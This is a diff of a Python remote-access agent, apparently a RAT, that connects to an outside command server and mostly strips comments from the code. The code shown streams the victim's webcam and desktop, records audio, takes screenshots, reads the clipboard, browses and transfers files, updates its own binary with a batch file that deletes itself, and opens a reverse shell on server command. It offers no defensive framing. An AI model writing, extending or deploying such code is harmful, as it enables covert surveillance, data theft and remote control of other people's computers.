@@ -14,12 +14,10 @@ from pathlib import Path
 import sys
 import tempfile
 import pynput
-# Import libraries for video and screen capture
 import cv2
 import mss
 import numpy
 import pyperclip
-# NEW: Import for audio recording
 try:
     import sounddevice as sd
     from scipy.io.wavfile import write as write_wav
@@ -27,7 +25,6 @@ except ImportError:
     sd = None
     write_wav = None
 
-# NEW: colored logging
 try:
     from colorama import Fore, Style, init
     init(autoreset=True)
@@ -52,17 +49,13 @@ class Logger:
     @staticmethod
     def comms(message): Logger._log("comms", Fore.MAGENTA, message)
 
-# --- Agent Configuration ---
 AGENT_ID = f"agent_{str(uuid.uuid4())[:8]}"
-# --- THIS IS THE UPDATED LINE ---
 SERVER_URL = 'https://lumen.swirly.hackclub.app'
-# --------------------------------
 RECONNECT_DELAY = 5
 STATS_INTERVAL = 3
 FRAME_RATE = 15
 FILE_CHUNK_SIZE = 1024 * 1024 
 
-# --- Global variables ---
 sio = socketio.Client()
 stream_thread, stats_thread = None, None
 stop_event = threading.Event()
@@ -76,7 +69,6 @@ IS_FROZEN = getattr(sys, 'frozen', False)
 failed_connection_attempts = 0
 
 
-# --- System & Stats Functions ---
 def get_ip_info():
     global ip_info_cache
     if ip_info_cache: return ip_info_cache
@@ -104,12 +96,12 @@ def stats_update_loop():
         except Exception as e: Logger.error(f"Stats loop error: {e}")
         stop_event.wait(STATS_INTERVAL)
 
-# --- Main Socket.IO Handlers ---
+
 @sio.event
 def connect():
     global stats_thread, failed_connection_attempts
     Logger.info("Successfully connected to server.")
-    failed_connection_attempts = 0 # Reset counter on successful connection
+    failed_connection_attempts = 0 
     stop_event.clear()
     sio.emit('register_agent', {'id': AGENT_ID, 'stats': get_system_stats()})
     if not (stats_thread and stats_thread.is_alive()):
@@ -119,7 +111,7 @@ def connect():
 def connect_error(data): Logger.error(f"Connection failed: {data}")
 
 @sio.event
-def disconnect(*args): # FIX: Accept arguments to prevent TypeError
+def disconnect(*args): 
     Logger.warn("Disconnected from server. Stopping threads.")
     stop_event.set()
     stop_reverse_shell()
@@ -127,6 +119,7 @@ def disconnect(*args): # FIX: Accept arguments to prevent TypeError
 @sio.on('command_to_agent')
 def handle_command(data):
     command = data.get('command')
+    
     Logger.comms(f"Received command: '{command}'")
     if command == 'start_webcam': start_streaming('webcam')
     elif command == 'start_desktop': start_streaming('desktop')
@@ -139,13 +132,12 @@ def restart_script():
     try:
         sio.emit('agent_response', {'agent_id': AGENT_ID, 'response': 'Restarting script... Connection will be lost temporarily.'})
     except Exception:
-        pass # Ignore if socket is already disconnected
+        pass 
     if sio.connected:
         sio.disconnect()
-    # This works for both a script and a frozen executable
     os.execv(sys.executable, [sys.executable] + sys.argv)
 
-# --- System Commands Implementation ---
+
 @sio.on('system_command_to_agent')
 def handle_system_command(data):
     command = data.get('command')
@@ -200,7 +192,7 @@ def get_clipboard():
     except Exception as e: content = f"Could not get clipboard: {e}"
     sio.emit('agent_response', {'agent_id': AGENT_ID, 'response': f"Clipboard content:\n---\n{content}\n---"})
 
-# --- Screenshot and Audio ---
+
 def take_screenshot():
     sio.emit('agent_response', {'agent_id': AGENT_ID, 'response': 'Taking screenshot...'})
     try:
@@ -216,7 +208,6 @@ def take_screenshot():
         shutil.move(sct_file, temp_path)
         
         Logger.info(f"Screenshot saved to {temp_path}, sending to server...")
-        # FIX: Run file transfer in a background thread to avoid blocking and causing a disconnect
         threading.Thread(target=send_file_to_server, args=(temp_path,), daemon=True).start()
     except Exception as e:
         Logger.error(f"Screenshot failed: {e}")
@@ -241,13 +232,11 @@ def record_audio(duration_str):
 
         write_wav(temp_path, fs, recording)
         Logger.info(f"Audio saved to {temp_path}, sending to server...")
-        # FIX: Run file transfer in a background thread to avoid blocking and causing a disconnect
         threading.Thread(target=send_file_to_server, args=(temp_path,), daemon=True).start()
     except Exception as e:
         Logger.error(f"Audio recording failed: {e}")
         sio.emit('agent_response', {'agent_id': AGENT_ID, 'response': f"Audio recording failed: {e}"})
 
-# --- Agent Binary Update Logic ---
 @sio.on('update_binary_chunk_to_agent')
 def handle_update_binary_chunk(data):
     global update_transfers
@@ -306,7 +295,7 @@ del "%~f0"
     if sio.connected: sio.disconnect()
     sys.exit(0)
 
-# --- FILE UPLOAD FROM SERVER ---
+
 @sio.on('file_upload_chunk_to_agent')
 def handle_file_upload_chunk(data):
     global file_uploads
@@ -345,7 +334,7 @@ def handle_file_upload_chunk(data):
                 upload['file'].close()
             del file_uploads[transfer_id]
 
-# --- FILE BROWSER IMPLEMENTATION ---
+
 def get_downloads_path(): return str(Path.home() / "Downloads")
 
 @sio.on('fb_command_to_agent')
@@ -392,19 +381,19 @@ def send_file_to_server(path):
     except Exception as e:
         Logger.error(f"Could not read file for download: {e}")
         sio.emit('agent_response', {'agent_id': AGENT_ID, 'response': f"Could not read file for download. Error: {e}"})
-    finally: # Cleanup for temp files (screenshots, audio)
+    finally: 
         if tempfile.gettempdir() in str(path):
             try: os.remove(path)
             except OSError: pass
 
-# --- Streaming & Shell ---
+
 def stream_loop(source):
     stop_event.clear()
     cap = None
     try:
         if source == 'webcam':
             cap = cv2.VideoCapture(0)
-            # FIX: Handle case where webcam is not available
+
             if not cap.isOpened():
                 Logger.error("Webcam could not be opened.")
                 sio.emit('agent_response', {'agent_id': AGENT_ID, 'response': 'Error: Webcam could not be opened. Is it in use?'})
@@ -455,13 +444,13 @@ def start_reverse_shell():
     threading.Thread(target=shell_reader, args=[shell_process.stderr, AGENT_ID], daemon=True).start()
 
 def stop_reverse_shell():
-    global shell_process # FIX: Declare as global to modify it
+    global shell_process 
     if shell_active.is_set():
         if shell_process:
             try:
                 shell_process.terminate()
             except ProcessLookupError:
-                pass # Process already terminated
+                pass 
             shell_process = None
         shell_active.clear()
 
@@ -470,7 +459,6 @@ def handle_shell_command(data):
     if shell_process and shell_active.is_set():
         shell_process.stdin.write((data.get('command', '') + '\n').encode('utf-8')); shell_process.stdin.flush()
 
-# --- Main Execution Loop ---
 if __name__ == '__main__':
     Logger.info(f"Agent '{AGENT_ID}' starting... Frozen: {IS_FROZEN}")
     get_ip_info()
@@ -480,7 +468,7 @@ if __name__ == '__main__':
         try:
             Logger.info(f"Attempting to connect to {SERVER_URL}...")
             sio.connect(SERVER_URL, transports=['websocket'])
-            sio.wait() # This will block until a disconnect occurs
+            sio.wait() 
         except socketio.exceptions.ConnectionError as e:
             failed_connection_attempts += 1
             Logger.error(f"Connection error: {e}. Failure {failed_connection_attempts}/{max_failed_attempts}.")
